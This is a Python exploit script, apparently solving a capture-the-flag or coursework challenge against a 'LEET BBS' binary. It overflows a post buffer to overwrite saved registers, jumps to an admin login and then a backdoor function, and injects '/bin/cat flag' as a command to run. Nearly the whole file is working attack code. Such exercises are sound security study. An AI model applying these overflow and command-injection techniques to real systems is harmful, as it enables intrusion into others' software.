import interact
import struct


# can i influence the stack pointer

# login in as admin -> bufferoverflow on password to hits backdoor function # null terminate the password so password check passes
# i retrunr to serve_bbs where i use overflow to target configure server
# when serve_bbs ends, i'll return to the admin function which  will go to backdoor


# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]


#rdi = "\x48\xc7\xc7\x00\x00\x00\x00"
#jmp = "\xff\xe5\x00\x00\x00\x00" # ff e5 ; jmp rbp
#input2 = input2 + rdi
#input2 = input2 + jmp



# \x80 \x21 \x60
#input2 = input2 + "\x80\x21\x60\x00\x00\x00\x00\x00"    # rip register; g_posts address

#-------------------------------------------------------------------------------


# target_function(bytes): the address of the function
def get_payload(target_function):
    input2 = "AAAAAAAacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaaa" # took off 13

    # nevermind
    input2 = input2 + "cccccccc"
    
    # RBX/RCX Register Value
    input2 = input2 + "bbbbbbbb"  #"abbaabca"               # rcx/rbx register

    # RBP Register now the address to g_posts
    # \x80 \x21 \x60
    input2 = input2 + "\x80\x21\x60\x00\x00\x00\x00\x00"    # rbp register; g_posts address



    # Address to `backdoor` function
    #40 0b 8a   400b8a
    #input2 = input2 + "\x8a\x0b\x40\x00\x00\x00\x00\x00"     # rip register; backdoor address
    input2 = input2 + target_function                        # rip register; target_function

    input2 = input2 + "\x09\x06\x07\x08" # dummy bytes

    return input2

#-------------------------------------------------------------------------------

# Trigger an overflow using out input and the client's functionality
#
# input1 (string): will be put in title section of user input
# input2 (string): will be put in contents section of user input
# post_index (string): a string integer denoting what index the created post will be in
def serve_bbs_interaction(input1, input2, post_index):
    # Create Post =====================================
    print(p.readuntil('choice:'))
    p.sendline('1')

    # Set Title =======================================
    print(p.readuntil('title:             |'))
    p.sendline(input1)

    # Set Contents ====================================
    print(p.readuntil('contents:          |'))
    p.sendline(input2)

    # Overwrite Buffer +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    # Exits ===========================================
    print(p.readuntil('Enter choice:'))
    p.sendline(post_index)

    # =================================================
    print(p.readuntil('continue...'))
    p.sendline("1")

    # Exit and trigger `targeted function` =============
    print(p.readuntil('Enter choice:'))
    p.sendline("2")
    
#-------------------------------------------------------------------------------

def login_as_admin_interaction():
    print(p.readuntil("+-----------------------------+"))
    p.sendline("l0ln0onewillguessth1s") # admin password

    print(p.readuntil("Press enter to continue..."))
    p.sendline("1")


def configure_server_interaction():
    
    # This is a serve_bbs interaction's hidden option for admin's
    print(p.readuntil('choice:'))
    p.sendline('0') # set server name
    
    # This is the configure_server choice menu. 2 is to 'Set Server Name'
    print(p.readuntil('choice: '))
    p.sendline('1') # set server name
    
    # This will set the server name to /bin/cat
    print(p.readuntil('Enter new server name: '))
    p.sendline('/bin/cat flag')



p = interact.Process()

# Post 1 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
ch = 'a'
input1 = ch * 30 #30


# Make Me An Admin First
# 40 0b ce
login_as_admin_address = "\xce\x0b\x40\x00\x00\x00\x00\x00"
input2 = get_payload(login_as_admin_address)
serve_bbs_interaction(input1, input2, "3")
login_as_admin_interaction()

# Now that I'm admin, I can configure server
configure_server_interaction()


# 40 0c a2
#configure_server_address = "\xa2\x0c\x40\x00\x00\x00\x00\x00"    # rip register; configure_server address
#input2 = get_payload(configure_server_address)
#serve_bbs_interaction(input1, input2, "4")
#configure_server_interaction()

#wdb> x/s 0x602160
#0x602160: "/\ LEET BBS /\\n"
#wdb> x/s g_server_name
#0x602160: "/\ LEET BBS /\\n"


# 40 0b 8a
backdoor_address = "\x8a\x0b\x40\x00\x00\x00\x00\x00"     # rip register; backdoor address
input2 = get_payload(backdoor_address)
serve_bbs_interaction(input1, input2, "4")


#-------------------------------------------------------------------------------

p.interactive()

